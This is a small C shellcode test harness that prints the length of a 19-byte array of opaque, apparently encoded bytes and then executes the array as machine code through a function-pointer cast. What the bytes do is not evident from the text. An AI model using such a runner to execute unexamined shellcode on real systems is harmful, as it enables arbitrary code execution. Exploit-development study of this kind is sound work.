#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x4b\xf7\x13\x59\xcc\x8c\x63\x5e\x9f\x8d\x99\x9f\x1f\xa4\x3b\x6e\xc6\x36\x23";

void main()
{
    printf("Shellcode length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}

